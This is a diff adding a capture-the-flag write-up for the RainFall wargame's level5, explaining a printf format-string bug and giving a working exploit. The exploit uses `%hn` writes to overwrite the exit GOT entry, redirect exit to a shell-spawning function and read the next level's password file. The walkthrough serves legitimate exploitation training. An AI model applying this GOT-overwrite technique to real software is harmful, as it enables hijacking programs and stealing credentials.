@@ -1,0 +1,27 @@
+# level5 → level6
+
+`n` passes input directly to `printf` and then calls `exit(1)`.
+`o` at `0x080484a4` runs `/bin/sh`. The binary has a writable `exit` GOT
+slot at `0x08049838`, so the format string can change the destination of
+the impending `exit` call to `o`.
+
+The first two words of input are `exit@got+2` and `exit@got`, appearing as
+format arguments 4 and 5. Initially eight bytes have printed. `%2044x`
+brings the count to 2052 (`0x0804`) for the high halfword. `%31904x`
+brings it to 33956 (`0x84a4`) for the low halfword. Both `%hn` writes use
+the count modulo 65536.
+
+From the level5 account on the RainFall VM:
+
+```sh
+(
+  python2.7 -c 'import struct; print struct.pack("<II",0x0804983a,0x08049838) + "%2044x%4$hn%31904x%5$hn"'
+  cat
+) | ./level5
+id
+cat /home/user/level6/.pass
+```
+
+Expect roughly 34 KiB of padding before the shell interaction. In GDB,
+inspect `o`, `n`, and `x/wx 0x08049838` to see the target and confirm the
+GOT slot changes before `exit`.
